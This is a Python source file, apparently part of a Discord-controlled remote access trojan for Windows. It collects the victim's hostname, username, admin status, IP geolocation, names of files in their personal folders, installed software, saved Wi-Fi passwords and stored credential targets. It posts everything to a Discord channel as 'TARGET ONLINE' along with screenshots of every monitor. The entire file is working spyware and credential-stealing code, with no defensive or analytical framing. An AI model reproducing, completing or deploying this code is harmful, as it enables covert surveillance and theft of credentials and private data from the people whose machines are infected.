import asyncio
import ctypes
import datetime
import io
import os
import pathlib
import socket

import discord
import psutil
import requests

from core import collect, capture, creds
from core.util import TAG


def _admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _geo():
    try:
        r = requests.get('http://ip-api.com/json', timeout=5).json()
        return {k: r.get(k) for k in ('country', 'regionName', 'city', 'zip', 'lat', 'lon',
                                      'isp', 'org', 'as', 'timezone', 'query')}
    except Exception:
        return {}


def _folders():
    out = {}
    home = pathlib.Path.home()
    for n in ('Desktop', 'Documents', 'Downloads', 'Pictures'):
        d = home / n
        if not d.exists():
            continue
        try:
            out[n] = sorted(p.name for p in list(d.iterdir())[:40])
        except Exception:
            pass
    return out


def _installed():
    try:
        from core.util import run_ps
        raw = run_ps('Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,'
                     'HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'
                     '|Where DisplayName|Select -Expand DisplayName', 40)
        return [l.strip() for l in raw.splitlines() if l.strip()]
    except Exception:
        return []


def report():
    a, disks, procs = collect.gather()
    return {
        'generated': datetime.datetime.now().isoformat(),
        'host': socket.gethostname(),
        'user': os.environ.get('USERNAME'),
        'admin': _admin(),
        'system': dict(a),
        'disks': disks,
        'top_processes': procs,
        'geo': _geo(),
        'folders': _folders(),
        'monitors': capture.monitors(),
        'wifi': creds.wifi(),
        'cmdkey': [x['target'] for x in creds.cmdkey()],
        'installed': _installed(),
        'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
        'battery': (psutil.sensors_battery()._asdict() if psutil.sensors_battery() else None),
    }


def _txt(rep):
    L = [f"=== {rep['host']} / {rep['user']} ===", f"generated {rep['generated']}",
         f"admin {rep['admin']}", '']
    L += [f'{k}: {v}' for k, v in rep['system'].items()]
    L += ['', '-- geo --'] + [f'{k}: {v}' for k, v in rep['geo'].items()]
    L += ['', '-- disks --'] + rep['disks']
    L += ['', '-- wifi --'] + [f"{w['ssid']} : {w['key'] or '(open)'} [{w['auth']}]" for w in rep['wifi']]
    L += ['', '-- cmdkey --'] + rep['cmdkey']
    L += ['', '-- monitors --'] + [f"{m['i']}: {m['w']}x{m['h']}" for m in rep['monitors']]
    L += ['', '-- folders --']
    for k, v in rep['folders'].items():
        L += [f'  [{k}]'] + [f'    {x}' for x in v]
    L += ['', '-- installed --'] + rep['installed']
    return '\n'.join(L)


async def dump(ch):
    rep = await asyncio.to_thread(report)
    if not ch:
        return rep

    e1 = discord.Embed(title='TARGET ONLINE', color=0x2b2d31, timestamp=discord.utils.utcnow())
    for k, v in list(rep['system'].items())[:12]:
        e1.add_field(name=k, value=f'`{v}`'[:1020], inline=True)
    e1.add_field(name='Admin', value='**YES**' if rep['admin'] else 'no', inline=True)
    await ch.send(content=f'{TAG}connected', embed=e1)

    g = rep['geo']
    e2 = discord.Embed(title='Network / location', color=0x2b2d31)
    e2.add_field(name='Geo', inline=False, value='```' + '\n'.join(
        f'{k}: {g.get(k)}' for k in ('country', 'regionName', 'city', 'zip', 'isp', 'org',
                                     'timezone', 'query'))[:1000] + '```')
    if rep['wifi']:
        e2.add_field(name='Wi-Fi', inline=False, value='```' + '\n'.join(
            f"{w['ssid']} : {w['key'] or '(open)'}" for w in rep['wifi'])[:1000] + '```')
    e2.add_field(name='Disks', inline=False, value='```' + '\n'.join(rep['disks'])[:1000] + '```')
    await ch.send(embed=e2)

    await ch.send(file=discord.File(io.BytesIO(_txt(rep).encode()), f'{rep["host"]}.txt'))

    for m in rep['monitors']:
        try:
            b = await asyncio.to_thread(capture.STREAM.snap_bytes, m['i'])
            await ch.send(content=f'monitor {m["i"]}',
                          file=discord.File(io.BytesIO(b), f'mon{m["i"]}.png'))
        except Exception:
            pass
    return rep